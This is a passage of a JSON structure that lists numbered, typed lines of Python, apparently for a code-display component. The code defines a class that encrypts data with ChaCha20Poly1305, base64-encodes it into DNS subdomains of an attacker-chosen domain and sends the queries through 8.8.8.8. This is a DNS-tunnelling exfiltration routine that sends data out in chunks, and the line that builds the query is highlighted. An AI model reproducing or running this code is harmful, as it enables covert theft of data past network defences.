        { "num": 5, "content": "", "type": "empty" },
        { "num": 6, "content": "    def __init__(self, domain, key):", "type": "def" },
        { "num": 7, "content": "        self.cipher = ChaCha20Poly1305(key)", "type": "code" },
        { "num": 8, "content": "        self.domain = domain", "type": "code" },
        { "num": 9, "content": "        self.session_id = os.urandom(4).hex()", "type": "code" },
        { "num": 10, "content": "", "type": "empty" },
        { "num": 11, "content": "    def send_chunk(self, data, record=\"TXT\"):", "type": "def" },
        { "num": 12, "content": "        nonce = os.urandom(12)", "type": "code" },
        { "num": 13, "content": "        encrypted = self.cipher.encrypt(nonce, data)", "type": "code" },
        { "num": 14, "content": "        subdomain = b64encode(encrypted).decode()", "type": "code" },
        { "num": 15, "content": "        query = f\"{subdomain}.{self.domain}\"", "type": "highlight" },
        { "num": 16, "content": "        dns.query.udp(dns.message.make_query(", "type": "code" },
        { "num": 17, "content": "            query, record), \"8.8.8.8\")", "type": "code" }
      ]
